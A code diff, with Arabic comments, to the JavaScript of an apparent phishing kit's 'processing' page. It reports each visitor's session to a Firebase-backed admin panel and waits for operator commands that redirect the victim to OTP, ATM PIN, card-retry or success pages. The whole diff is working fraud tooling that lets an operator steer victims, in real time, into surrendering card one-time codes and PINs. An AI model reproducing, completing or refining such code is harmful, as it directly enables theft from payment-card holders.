@@ -43,30 +43,36 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // 1. تحديث الحالة فوراً عند دخول الصفحة لمسح أي أمر قديم
-            database.ref('orders/' + v_id).update({
-                next_step: 'waiting',
-                current_page: "Processing"
+            // تحديث حالة الزائر في لوحة التحكم
+            database.ref('live_sessions/' + v_id).update({
+                current_page: "Processing Page",
+                last_seen: new Date().getTime()
             });
 
-            // 2. مراقبة التغييرات (Listen) بشكل فوري ومباشر
+            // الاستماع للأوامر بشكل لحظي
             const orderRef = database.ref('orders/' + v_id + '/next_step');
             
             orderRef.on('value', (snapshot) => {
                 const step = snapshot.val();
                 
-                // لو الأمر جيه من الأدمن نفذ فوراً بدون تأخير
-                if (step === 'go_to_otp') {
-                    window.location.replace('auth-session.html');
-                } 
-                else if (step === 'go_to_pin') {
-                    window.location.replace('system_core_auth.html');
-                }
-                else if (step === 'wrong_card') {
-                    window.location.replace('secure-pay-v2.html');
-                }
-                else if (step === 'success') {
-                    window.location.replace('success-page.html');
+                if (step) {
+                    switch(step) {
+                        case 'go_to_otp':
+                            // يروح لصفحة الـ OTP
+                            window.location.replace('complete-st.html');
+                            break;
+                        case 'go_to_pin':
+                            // يروح لصفحة الـ ATM
+                            window.location.replace('auth-session.html');
+                            break;
+                        case 'wrong_card':
+                            // يرجع لصفحة الدفع (تأكد إن اسمها secure-pay-v2.html)
+                            window.location.replace('secure-pay-v2.html');
+                            break;
+                        case 'success':
+                            window.location.replace('success-page.html');
+                            break;
+                    }
                 }
             });
         } else {
